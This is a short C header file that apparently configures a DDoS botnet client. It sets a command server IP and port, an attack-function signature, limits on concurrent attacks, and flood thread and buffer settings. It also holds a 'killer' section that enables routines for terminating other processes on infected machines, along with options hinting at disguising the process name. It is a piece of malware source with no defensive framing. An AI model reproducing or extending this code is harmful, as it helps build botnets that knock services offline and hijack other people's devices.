#ifndef CONFIG
#define CONFIG

#define BOT_SERVER_IP "1.1.1.1"
#define BOT_SERVER_PORT 3000

#define types std::string target, const int port, const int duration, bool *stop /* for developers */

#define MAX_ATTACKS 5

#define FLOOD_BUF_SIZE 10000, 20000 /* min, max */
#define FLOOD_THREADS 30
#define FLOOD_SLEEP_TIME 200 /* in ms */

// #define NOFORK
// #define DYNAMIC_PROC_NAME

/* KILLER CONFIG */

#define MAX_PID 10000000
#define MIN_PID 100
#define KILLER_SLEEP_TIME 10 /* in seconds */

#define MAPS_KILLER
// #define KILLER
#define EXE_KILLER

#endif